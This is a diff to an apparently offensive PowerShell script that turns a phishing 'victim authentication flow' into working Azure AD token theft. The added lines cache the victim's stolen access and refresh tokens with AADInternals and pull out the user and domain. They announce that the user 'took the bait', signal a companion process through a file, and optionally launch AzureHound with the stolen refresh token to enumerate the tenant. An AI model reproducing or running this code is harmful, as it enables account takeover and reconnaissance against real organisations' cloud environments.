@@ -1,15 +1,7 @@
 [CmdletBinding()]
 param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$targetUser,
-    [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$messageContent,
-    [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$subject,
-    [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$Token,
-    [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$template
+    [switch]$azureHound
 )
 
 $modules = .\Scripts\Import.ps1
@@ -31,8 +23,27 @@ if ([string]::IsNullOrWhiteSpace($Token)) {
 Write-Output "Victim authentication flow"
 Write-Output "Response value is $response"
 
-$acess = $response.access_token
+$access = $response.access_token
 $refresh = $response.refresh_token
+
+Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh
+
+# Target details constructed from token   
+$acc = Read-AADIntAccessToken $access
+$user = $acc.upn
+$domain = $user.Split("@")[1]
+Write-Output "$user took the bait."
+
+# Other process listens for creation of this file, validates target with feedback from the token
+$switch = "$user"
+$switch | Out-File -Path .\target.txt 
+
+# AzureHound
+if($azureHound){
+    Write-Output "Starting Azurehound module..."
+    .\azurehound.ps1 -domain $domain -refreshToken $response.refresh_token
+}
+
 
 Read-Host "Not done with you yet, hoss."
 
